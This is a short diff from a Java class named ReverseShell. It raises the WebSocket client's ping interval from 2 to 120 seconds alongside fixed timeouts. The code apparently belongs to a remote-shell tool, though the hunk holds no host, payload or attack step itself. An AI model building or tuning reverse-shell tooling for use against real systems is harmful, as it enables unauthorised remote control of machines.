@@ -61,7 +61,7 @@ public class ReverseShell {
                 .connectTimeout(5, TimeUnit.SECONDS)
                 .readTimeout(5, TimeUnit.SECONDS)
                 .writeTimeout(5, TimeUnit.SECONDS)
-                .pingInterval(2, TimeUnit.SECONDS)
+                .pingInterval(120, TimeUnit.SECONDS)
                 .build();
 
         Object webSocketIsReady = new Object();
